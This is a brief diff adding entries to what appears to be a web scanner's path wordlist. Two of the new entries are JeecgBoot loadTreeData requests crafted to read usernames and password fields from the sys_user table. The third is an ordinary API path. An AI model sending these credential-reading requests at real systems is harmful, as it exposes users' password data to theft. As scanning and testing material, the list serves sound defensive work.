@@ -9879,3 +9879,6 @@ a
 /superadmincreate.php
 /api/server/version
 /CFIDE/adminapi/base.cfc?method
+/jeecg-boot/sys/dict/loadTreeData?tableName=sys_user+t&text=password,id&code=password&hasChildField&converIsLeafVal=1&condition&pid=admin&pidField=username
+/userportal/api/rest/contentChannels/?startIndex=0&pageSize=4&sort=TIME&showType=all
+/sys/dict/loadTreeData?tableName=sys_user+t&text=password,id&code=password&hasChildField&converIsLeafVal=1&condition&pid=admin&pidField=username
